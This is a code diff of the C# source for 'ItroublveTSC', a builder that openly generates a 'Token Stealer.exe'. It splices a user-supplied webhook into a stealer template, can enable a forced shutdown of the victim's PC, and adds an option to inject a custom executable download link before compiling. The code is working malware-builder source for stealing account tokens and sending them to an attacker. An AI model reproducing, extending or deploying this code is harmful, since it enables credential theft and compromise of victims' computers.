@@ -29,7 +29,6 @@ namespace ItroublveTSC
         private void frmMain_Load(object sender, EventArgs e)
         {
         }
-
         private void CreateBtn_Click(object sender, EventArgs e)
         {
             bool flag = this.WebHookTxt.Text == "" || this.WebHookTxt.Text == "WebHook Here";
@@ -65,10 +64,6 @@ namespace ItroublveTSC
                     if (ShutdownPCchkbox.Checked)
                     {
                         text = text.Replace("rem SHUTDOWN /s /t 30 /c", "SHUTDOWN /s /t 30 /c");
-                    }
-                    if (BootloopPCchckbox.Checked)
-                    {
-                        MessageBox.Show("I'm still working on this feature - Bootloop PC", "ItroublveTSC");
                     }
                     text = text.Replace("Webhook", WebHookTxt.Text);
                     File.WriteAllText("TokenStealerCopy.bin", text);
@@ -112,11 +107,11 @@ namespace ItroublveTSC
             bool flag4 = this.SendhookfileTxt.Text == "" || this.SendhookfileTxt.Text == "Sendhookfile.exe Link Here";
             if (flag)
             {
-                MessageBox.Show("You need to paste a link to Token stealer.bat here!", "ItroublveTSC");
+                MessageBox.Show("You need to paste a link to Token stealer.bat!", "ItroublveTSC");
             }
             if (flag4)
             {
-                MessageBox.Show("You need to paste a link to Sendhookfile.exe here!", "ItroublveTSC");
+                MessageBox.Show("You need to paste a link to Sendhookfile.exe!", "ItroublveTSC");
             }
             else
             {
@@ -137,6 +132,12 @@ namespace ItroublveTSC
                     {
                         text = text.Replace("//RemoveEXE", "RemoveEXE");
                     }
+                    if (CustomEXEchkbox.Checked)
+                    {
+                        text = text.Replace("customexelink", CustomExeTxt.Text);
+                        text = text.Replace("/*", "");
+                        text = text.Replace("*/", "");
+                    }
                     File.WriteAllText(@"bin_copy/Program.cs", text);
 
                     Process.Start(new ProcessStartInfo()
@@ -146,7 +147,7 @@ namespace ItroublveTSC
                         CreateNoWindow = true,
                         FileName = "cmd.exe"
                     });
-                    Thread.Sleep(2000);
+                    Thread.Sleep(5000);
                 }
                 catch
                 {
@@ -180,14 +181,14 @@ namespace ItroublveTSC
                     if (!File.Exists(path))
                     {
                         using (FileStream fs = File.Create(path)) { }
-                    }  
+                    }
                     if (File.Exists(path2))
                         File.Delete(path2);
                     File.Move(path, path2);
                     Directory.Delete(folderPath, true);
                     MessageBox.Show("Token Stealer.exe successfully compiled!", "ItroublveTSC");
                 }
-                catch(Exception ex)
+                catch (Exception ex)
                 {
                     MessageBox.Show("Failed to create token stealer.\r\n.NET Framework might be missing, take a look below to know reason!\r\n" + (ex.Message), "ItroublveTSC");
                 }
@@ -198,11 +199,32 @@ namespace ItroublveTSC
         {
             try
             {
-                Process.Start("https://itroublvehacker.ml/");
+                Process.Start("https://youtu.be/H05oG6aQnto");
             }
             catch(Exception ex)
             {
-                MessageBox.Show("Failed to open" + "How To Use" + (ex.Message), "ItroublveTSC");
+                MessageBox.Show("Failed to open" + "How To Use\r\n" + (ex.Message), "ItroublveTSC");
+            }
+        }
+
+        private void CustomEXEchkbox_CheckedChanged(object sender, EventArgs e)
+        {
+            if (CustomEXEchkbox.Checked)
+            {
+                CustomExeTxt.Enabled = true;
+            }
+            else
+            {
+                CustomExeTxt.Enabled = false;
+            }
+        }
+
+        private void BootloopPCchckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            if (BootloopPCchckbox.Checked)
+            {
+                MessageBox.Show("I'm still working on this feature - Bootloop PC", "ItroublveTSC");
+                BootloopPCchckbox.Checked = false;
             }
         }
     }
